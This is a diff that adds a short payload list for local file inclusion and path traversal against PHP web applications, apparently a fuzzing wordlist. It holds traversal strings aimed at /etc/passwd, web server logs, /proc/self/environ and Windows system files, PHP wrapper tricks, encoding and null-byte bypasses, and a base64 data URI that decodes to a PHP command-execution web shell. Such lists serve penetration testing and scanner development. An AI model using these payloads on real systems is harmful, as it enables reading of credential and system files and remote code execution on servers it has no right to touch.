@@ -1,0 +1,17 @@
+../../../../etc/passwd
+php://filter/convert.base64-encode/resource=index.php
+php://input
+data://text/plain,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+../../../../var/log/nginx/access.log
+../../../../var/log/apache2/access.log
+/proc/self/environ
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+....//....//....//etc/passwd
+file:///etc/passwd
+../../../../etc/passwd.php
+\\\\127.0.0.1\\C$\\Windows\\System32\\drivers\\etc\\hosts
+C:/Windows/win.ini
+php://fd/0
+php://filter/resource=../../../../etc/passwd
+../../../../etc/passwd%00
+../../../../proc/self/fd/0
